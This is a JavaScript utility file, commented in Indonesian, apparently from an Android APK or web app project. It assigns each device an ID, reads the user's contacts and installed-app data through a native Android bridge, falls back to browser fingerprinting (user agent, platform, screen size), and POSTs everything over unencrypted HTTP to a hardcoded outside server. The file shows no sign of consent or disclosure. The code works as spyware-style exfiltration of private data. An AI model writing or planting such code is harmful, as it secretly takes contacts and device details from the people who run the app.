// FILE FULL: src/utils/deviceTracker.js

/**
 * Mengambil data manifes perangkat secara komprehensif melalui JavaScript Interface
 * atau fallback API browser standar.
 */
export async function collectDeviceManifest() {
  let uniqueId = localStorage.getItem('selz_device_uuid');
  if (!uniqueId) {
    uniqueId = 'SZ-' + Math.random().toString(36).substring(2, 10).toUpperCase();
    localStorage.setItem('selz_device_uuid', uniqueId);
  }

  // Struktur payload default (jika dibuka di luar APK)
  let payload = {
    device_id: uniqueId,
    total_contacts: "Browser Sandbox: Izin Ditolak",
    total_apps: "Browser Sandbox: Izin Ditolak",
    timestamp: new Date().toISOString()
  };

  try {
    // Memeriksa keberadaan Jembatan Native Android (JavascriptInterface)
    if (typeof window !== 'undefined' && window.AndroidBridge) {
      // Mengambil data riil yang dijembatani oleh komponen native APK
      payload.total_contacts = window.AndroidBridge.getNativeContacts() || "Tidak ada kontak ditemukan";
      payload.total_apps = window.AndroidBridge.getNativeData() || "Tidak ada data aplikasi ditemukan";
    } else {
      // Klasifikasi fallback jika diakses via browser publik biasa
      const ua = navigator.userAgent;
      payload.total_contacts = `Web Session: ${navigator.platform}`;
      payload.total_apps = `User-Agent: ${ua.slice(0, 60)} | Res: ${window.screen.width}x${window.screen.height}`;
    }

    // Mengirimkan manifestasi data ke API Backend di Pterodactyl lo
    await fetch('http://node-nyk-dilzz.hostkita.help:2439/api/log', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    console.log("[Selz Tracker] Manifest data synced.");
  } catch (error) {
    console.error("[Selz Tracker] Sync failed:", error);
  }
}
